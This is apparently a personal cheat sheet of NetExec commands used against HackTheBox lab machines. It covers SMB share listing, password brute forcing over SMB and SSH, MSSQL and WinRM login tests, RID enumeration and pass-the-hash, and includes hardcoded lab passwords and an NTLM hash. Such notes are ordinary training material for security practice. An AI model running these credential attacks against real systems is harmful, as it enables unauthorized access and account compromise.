__tags: windows linux smb mssql winrm ssh


#### List all shares with username and password:
```bash
netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
```

#### Trying Differnt passwords and users for smb brute force
```bash
netexec smb 10.10.11.51 -u users.txt -p pass.txt
```

#### Test mysql login
```bash
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
```

#### Test WinRm login
```bash
nxc winrm sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3'
```

#### Login with creds via SMB and brute force for passwords:
```bash
nxc smb 10.10.11.61 -u paul.taylor -p 'PASSSWORD1' --rid-brute
```

#### Verify Authtication with Hash
```bash
nxc smb 10.10.11.61 -u 'Haze-IT-Backup$' -H 723fd747a7523dbebfc5b1d3d759ffbf

#Mote the above is a computer/service account
```

#### SSH test passwords

```bash

nxc ssh agile.htb -u user.txt -p passwords.txt --no-bruteforce

```

